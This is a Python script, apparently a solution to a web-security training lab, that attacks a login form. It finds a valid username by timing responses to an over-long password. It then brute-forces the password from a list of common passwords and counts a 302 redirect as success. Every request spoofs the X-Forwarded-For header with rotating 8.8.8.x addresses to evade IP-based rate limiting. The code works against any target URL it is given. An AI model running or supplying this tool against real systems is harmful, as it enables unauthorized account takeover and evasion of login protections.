"""
Change the IP : ip = "8.8.8." + str(i) ; header = {"X-Forwarded-For" : ip}
Response timing: (req.elapsed.microseconds//1000)
"""

import requests
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


lab_url = str(input('Enter the target URL:' ))
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
    }

users = ["carlos","root","admin","test","guest","info","adm","mysql","user","administrator","oracle","ftp","pi","puppet","ansible","ec2-user","vagrant","azureuser","academico","acceso","access","accounting","accounts","acid","activestat","ad","adam","adkit","admin","administracion","administrador","administrator","administrators","admins","ads","adserver","adsl","ae","af","affiliate","affiliates","afiliados","ag","agenda","agent","ai","aix","ajax","ak","akamai","al","alabama","alaska","albuquerque","alerts","alpha","alterwind","am","amarillo","americas","an","anaheim","analyzer","announce","announcements","antivirus","ao","ap","apache","apollo","app","app01","app1","apple","application","applications","apps","appserver","aq","ar","archie","arcsight","argentina","arizona","arkansas","arlington","as","as400","asia","asterix","at","athena","atlanta","atlas","att","au","auction","austin","auth","auto","autodiscover"]
passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

with requests.session() as ses:

    

#Finds the changes in response time and find the correct username
    def usernameenum(url, users, proxies):
        response_time = []
        username = ""

        for i in range( 0, len(users)):
            bodi = { "username": users[i], "password": "abcddcndcjkndckjncdsjkcndckljcnsdklcndslkcmdslkcmdkslcmscnkjlsdcnkdcnaoncksdjcnvajkdfvndjfvnjdfvnjdsfvnjksdfvnkjdfvnkdlsfvksfvndfkjvdnfskvjdnfvlkjfv" }
            ip = "8.8.8." + str(i)
            header = {"X-Forwarded-For" : ip}
            start = time.time()
            req = ses.post(url , data=bodi, headers=header , proxies=proxies , verify=False)
            if (len(response_time) == 0):
                response_time.append((req.elapsed.microseconds//1000))
            
            if((req.elapsed.microseconds//1000)>response_time[0]):
                response_time.append((req.elapsed.microseconds//1000))
                username = users[i]
        
        print("Username found")
        
        return username

    def get_pass(url , user , passw):
        pass_found = ""
        for i in range( 0, len(passw)):
            bodi = { "username": user, "password": passw[i]}
            ip = "8.8.8." + str(i)
            header = {"X-Forwarded-For" : ip}
            req = ses.post(url , data=bodi, allow_redirects=False, headers=header)
            if(req.status_code == 302):
                pass_found = passw[i]
        
        return(pass_found)


found_user = usernameenum(lab_url, users=users, proxies=proxies)
found_pass = get_pass(lab_url, found_user, passwords)

print(f'Username is: {found_user} and password is {found_pass}')


